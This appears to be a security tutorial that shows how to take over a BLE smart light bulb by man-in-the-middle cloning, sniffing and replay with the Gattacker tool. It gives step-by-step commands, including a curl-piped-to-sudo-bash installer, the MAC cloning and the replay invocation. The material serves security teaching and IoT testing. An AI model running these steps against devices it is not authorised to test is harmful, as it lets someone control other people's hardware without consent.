# Exploiting a Smart Bulb using MiTM

 


## INTRODUCTION

In this post, we are going to discuss about how to take over a BLE based IoT smart bulb, sniff the communication packets and perform modification and replay based attacks all without the knowledge of either of the two devices.

## HYPOTHESIS

Man-in-the-Middle is the approach we will be discussing first. As the name suggests this method involves the third device apart from the two connecting devices in a BLE Connection which emulates one of the devices, thus virtually taking control of the data transfer between the two devices. While in most cases the attack is done before a successful connection is established, here we perform the attack after a successful connection is established between both the devices.

Ever since BLE has been proven insecure against eavesdropping a lot of open-source MitM architectures such as Gattacker were created. Attackers do not need to trick users into performing an action to compromise or infect them, nor does a target device&#39;s Bluetooth have to pair with an attack device. The device simply has to have its Bluetooth feature turned on, which for most products is the default setting.

## WHAT IS IT ALL ABOUT?

Bluetooth Low Energy [incorporates device pairing and link-layer encryption.](https://developer.bluetooth.org/TechnologyOverview/Pages/LE-Security.aspx) However, a significant amount of devices do not implement these features. They either do not provide transmission security at all, or ensure it by own means in application layers. The vendors promise &quot;128-bit military grade encryption&quot; and &quot;unprecedented level of security&quot;, not willing to share technical details. We have seen such declarations before, and many times they did not withstand professional, independent evaluation and turned out to be [&quot;snake oil&quot;](https://en.wikipedia.org/wiki/Snake_oil_%28cryptography%29) security.

## TOOLs REQUIRED

- Gattacker:

The tool creates an exact copy of attacked device in Bluetooth layer, and then tricks mobile application to interpret its broadcasts and connect to it instead of the original device. At the same time, it keeps active connection to the device, and forwards to it the data exchanged with mobile application. In this way, acting as &quot;Man-in-the-Middle&quot;, it is possible to intercept and/or modify the transmitted requests and responses.


## PROCEDURE




## Installing Gattacker and configuring it;


To install Gattacker, you will need the 8th version of node.js. This can be done using the following commands:

First, let&#39;s make sure we have curl installed:

**sudo apt install curl**

Once that&#39;s done, download and run the Node.js 8.x installer with the following command:

**curl -sL https://deb.nodesource.com/setup\_8.x | sudo -E bash -**

All that&#39;s left to do is to install (or upgrade to) the latest version of Node.js 8.x:

**sudo apt install nodejs**

To install Gattacker, you will need the latest version of various bluetooth packages. This can be done using the below command:

**sudo apt-get install bluetooth bluez libbluetooth-dev libudev-dev**

Next, we need to install bleno and noble which are A Node.js modules for implementing BLE (Bluetooth Low Energy) peripherals.

**npm install bleno**

**npm install noble**

In case you get an error, ensure that you have correctly installed the node and npm packages earlier.

Now install Gattacker using the command

**npm install gattacker**

Repeat the same steps on another Virtual Machine (or system) as we will be requiring two machines - one for host and one for slave.

Once done, plug in the ble adaptor if needed and ensure that its plugged using sudo hciconfig.

Navigate to gattacker folder for the further steps

**cd node\_modules/gattacker**

Next, we will need to edit the config.env in order to configure gattacker for our setup.

**sudo \&lt;editor of choice\&gt; config.env**

Here uncomment the **NOBLE\_HCI\_DEVICE\_ID** and then replace it with the hciX where (X is the value which we found earlier through hciconfig) and save the file.

Now in the host machine, plug in the BLE adaptor and follow the above steps. For the config.env follow the below steps:

- uncomment the NOBLE\_HCI\_DEVICE\_ID
- uncomment the BLENO\_HCI\_DEVICE\_ID

Assign them to the hciX value.

Once done, in the WS\_SLAVE, replace it with the IP address of the slave machine as in the image:

Once done, save the configuration file. Now we are ready to start using Gattacker and exploit some IoT devices.

## Using Gattacker to scan and store Device Information.


Open up the slave VM and launch ws-slave.js as shown below:

**sudo node ws-slave.js**

![](https://raw.githubusercontent.com/IndrarajBiswas/SecCon-19/master/ble_bulb/Images/2.png?token=AM3WYOY2QLDM6FUYCPRXLOS5XLNPG)


Here the advertisement packets are captured and saved in a file.

Now to save the service we run the command:

**sudo node scan \&lt;peripheral name of the bulb as saved by gattacker\&gt;**

![](https://github.com/IndrarajBiswas/SecCon-19/blob/master/ble_bulb/Images/3.png?raw=true)

The captured services and the advertisements are automatically updated in the slave devices so the emulation of the bulb is completed.


## Using Gattacker to dump and replay the information:


_Next we clone the MAC address of the original device along with the additional parameters as shown:_

**sudo ./mac\_adv -a devices/f81d786312ce\_LEDBLE-786312CE.20190917115412.adv.json.adv.json -s devices/f81d786312ce.srv.json**

_We should get a message like this:_
![](https://github.com/IndrarajBiswas/SecCon-19/blob/master/ble_bulb/Images/4.png?raw=true)

_Now open a new terminal and type_

**sudo hciconfig hciX down**

_Where X is the the value got earlier from hciconfig, then press enter on the other terminal._

![](https://github.com/IndrarajBiswas/SecCon-19/blob/master/ble_bulb/Images/5.png?raw=true)

Now open the SMARTBULB app from the phone and scan for devices.

![](https://github.com/IndrarajBiswas/SecCon-19/blob/master/ble_bulb/Images/6.png?raw=true)

Now connect to the device and change the light bulb color.

Now the RaspPi starts sniffing packets transferred between the devices and thus the packets will be captured by the RaspPi as shown in the image below: 
![](https://github.com/IndrarajBiswas/SecCon-19/blob/master/ble_bulb/Images/7.png?raw=true)

Now exit this by ctrl + c

Now this value is saved in the dump folder so navigate to the dump folder and open up the file:

**sudo \&lt;editor of choice\&gt; \&lt;peripheral id of the bulb\&gt;.log**

Now edit it according to your needs.

Now in the host machine after the mobile and the bulb is disconnected, type in the following command to replay the attack.

**sudo node replay.js -i dump/f81d786312ce.log -p f81d786312ce -s devices/f81d786312ce.srv.json**

![](https://github.com/IndrarajBiswas/SecCon-19/blob/master/ble_bulb/Images/8.png?raw=true)

If you will look at the bulb now, the attack has successfully been executed, and we have been able to control a BLE enabled IoT Smart Light Bulb using Gattacker.If you will look at the bulb now, the attack has successfully been executed, and we have been able to control a BLE enabled IoT Smart Light Bulb using Gattacker.
